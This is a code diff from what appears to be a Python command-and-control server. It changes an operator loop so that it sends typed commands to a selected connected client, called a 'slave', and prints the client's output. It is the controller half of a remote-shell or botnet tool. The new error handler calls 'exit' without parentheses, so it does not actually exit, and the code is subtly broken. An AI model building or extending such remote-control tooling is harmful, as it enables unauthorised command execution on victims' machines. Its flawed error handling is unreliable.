@@ -31,10 +31,15 @@ def main():
                 if slave == -1:
                     break
                 while True:
-                    msg = input("[+] enter message: ")
-                    slaves[slave].send(msg.encode())
-                    if msg == "exit":
-                        break
+                    try:
+                        msg = input("[+] enter command: ")
+                        slaves[slave].send(msg.encode())
+                        if msg == "exit":
+                            break
+                        print(slaves[slave].recv(1024).decode())
+                    except:
+                        print("exiting")
+                        exit
                 
             if slave==-1:
                 break
